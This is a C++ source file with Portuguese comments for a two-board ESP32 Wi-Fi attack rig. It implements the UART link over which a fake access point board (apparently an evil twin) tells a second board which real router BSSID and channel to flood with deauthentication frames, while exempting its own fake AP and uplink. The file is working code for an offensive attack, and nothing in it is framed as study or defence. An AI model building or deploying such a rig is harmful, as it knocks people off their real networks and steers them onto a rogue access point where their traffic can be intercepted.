#include "funcoes_evtw.h"

// ---------------------------------------------------------------------------
// ENLACE UART entre as duas ESP32
//
// Protocolo (linhas ASCII terminadas em '\n', legiveis no monitor serial):
//
//   ESP#1 (AP+NAT)  ->  ESP#2 (deauth):
//     EVTW ch=<n> bssid=<alvo> ap=<ap_falso> sta=<uplink> go=<0|1>
//       ch    : canal da rede real/falsa (as duas placas travam nele)
//       bssid : BSSID do roteador REAL        -> alvo do deauth
//       ap    : BSSID do AP falso             -> NAO atacar
//       sta   : MAC do STA do repetidor       -> NAO atacar (e a internet!)
//       go    : 1 = pode floodar, 0 = pausa (repetidor reconectando)
//
//   ESP#2 (deauth)  ->  ESP#1 (AP+NAT):  (telemetria, so pra log)
//     DEAUTH vitimas=<n> ok=<n> err=<n> ch=<n>
//
// Seguranca: o deauth comeca PAUSADO. So injeta depois de receber um EVTW com
// 'sta' valido e go=1. Assim ele nunca derruba o uplink antes de aprender a
// proteger o STA do repetidor.
// ---------------------------------------------------------------------------

// Estado compartilhado (consumido pelo deauth.cpp)
volatile uint8_t mac_ap_protegido[6]  = {0};
volatile uint8_t mac_sta_protegido[6] = {0};
volatile bool    protegidos_validos   = false;
volatile bool    deauth_autorizado    = false;

#define ENLACE_LINHA_MAX 128

// --- helpers de MAC ---------------------------------------------------------

static bool parseMac(const char* s, uint8_t* out) {
    unsigned int b[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x",
               &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6)
        return false;
    for (int i = 0; i < 6; i++) out[i] = (uint8_t)b[i];
    return true;
}

static bool macZerado(const uint8_t* m) {
    for (int i = 0; i < 6; i++) if (m[i]) return false;
    return true;
}

static void fmtMac(char* dst, const uint8_t* m) {
    sprintf(dst, "%02X:%02X:%02X:%02X:%02X:%02X",
            m[0], m[1], m[2], m[3], m[4], m[5]);
}

// --- init -------------------------------------------------------------------

void enlaceIniciar() {
    Serial2.begin(ENLACE_BAUD, SERIAL_8N1, PINO_ENLACE_RX, PINO_ENLACE_TX);
    Serial.printf(">> [enlace] UART2 ativa (RX=GPIO%d, TX=GPIO%d, %d bps)\n",
                  PINO_ENLACE_RX, PINO_ENLACE_TX, ENLACE_BAUD);
}

// Leitor de linha nao-bloqueante. Retorna true quando uma linha completa foi
// montada em 'linha'. Chamar em loop ate retornar false.
static bool lerLinha(char* linha, size_t cap) {
    static char   buf[ENLACE_LINHA_MAX];
    static size_t pos = 0;
    while (Serial2.available()) {
        char c = (char)Serial2.read();
        if (c == '\n' || c == '\r') {
            if (pos == 0) continue;          // ignora linhas vazias
            buf[pos] = '\0';
            size_t n = (pos < cap - 1) ? pos : cap - 1;
            memcpy(linha, buf, n);
            linha[n] = '\0';
            pos = 0;
            return true;
        }
        if (pos < sizeof(buf) - 1) buf[pos++] = c;
        else                        pos = 0;  // linha longa demais: descarta
    }
    return false;
}

// --- ESP #2 (deauth): recebe e aplica o estado --------------------------------

void enlaceAtualizarDeauth() {
    static int canal_aplicado = -1;

    char linha[ENLACE_LINHA_MAX];
    while (lerLinha(linha, sizeof(linha))) {
        if (strncmp(linha, "EVTW", 4) != 0) continue;

        int     ch = -1, go = -1;
        uint8_t bssid[6] = {0}, ap[6] = {0}, sta[6] = {0};
        bool    temBssid = false, temAp = false, temSta = false;

        // tokeniza "chave=valor"
        char* ctx = nullptr;
        for (char* tok = strtok_r(linha, " ", &ctx); tok;
             tok = strtok_r(nullptr, " ", &ctx)) {
            char* eq = strchr(tok, '=');
            if (!eq) continue;
            *eq = '\0';
            const char* chave = tok;
            const char* val   = eq + 1;
            if      (!strcmp(chave, "ch"))    ch = atoi(val);
            else if (!strcmp(chave, "go"))    go = atoi(val);
            else if (!strcmp(chave, "bssid")) temBssid = parseMac(val, bssid);
            else if (!strcmp(chave, "ap"))    temAp    = parseMac(val, ap);
            else if (!strcmp(chave, "sta"))   temSta   = parseMac(val, sta);
        }

        // Atualiza alvo real (sobrepoe o scan local -> as placas ficam em sync)
        if (temBssid && !macZerado(bssid)) memcpy(bssid_alvo, bssid, 6);
        if (temAp)  memcpy((void*)mac_ap_protegido,  ap,  6);
        if (temSta) memcpy((void*)mac_sta_protegido, sta, 6);

        // So e seguro atacar quando sabemos quem proteger (o uplink STA)
        if (temSta && !macZerado(sta)) protegidos_validos = true;

        // Trava o radio no canal informado pelo master, se mudou
        if (ch >= 1 && ch <= 14 && ch != canal_aplicado) {
            canal_alvo = ch;
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            canal_aplicado = ch;
            Serial.printf(">> [enlace] canal travado em %d (ordem do AP+NAT)\n", ch);
        }

        // Autoriza/pausa o flood
        bool autorizar = (go == 1) && protegidos_validos;
        if (autorizar != deauth_autorizado) {
            deauth_autorizado = autorizar;
            Serial.printf(">> [enlace] deauth %s\n",
                          autorizar ? "AUTORIZADO" : "PAUSADO");
        }
    }
}

// --- ESP #1 (AP+NAT): anuncia o estado ----------------------------------------

void enlaceAnunciar(bool rodar) {
    uint8_t ap_mac[6], sta_mac[6];
    WiFi.softAPmacAddress(ap_mac);   // BSSID do AP falso (a proteger)
    WiFi.macAddress(sta_mac);        // MAC do STA/uplink   (a proteger)

    char sBssid[18], sAp[18], sSta[18];
    fmtMac(sBssid, bssid_alvo);
    fmtMac(sAp,    ap_mac);
    fmtMac(sSta,   sta_mac);

    Serial2.printf("EVTW ch=%d bssid=%s ap=%s sta=%s go=%d\n",
                   canal_alvo, sBssid, sAp, sSta, rodar ? 1 : 0);

    // Consome telemetria de volta do deauth (apenas loga)
    char linha[ENLACE_LINHA_MAX];
    while (lerLinha(linha, sizeof(linha))) {
        if (strncmp(linha, "DEAUTH", 6) == 0)
            Serial.printf(">> [enlace<-deauth] %s\n", linha);
    }
}
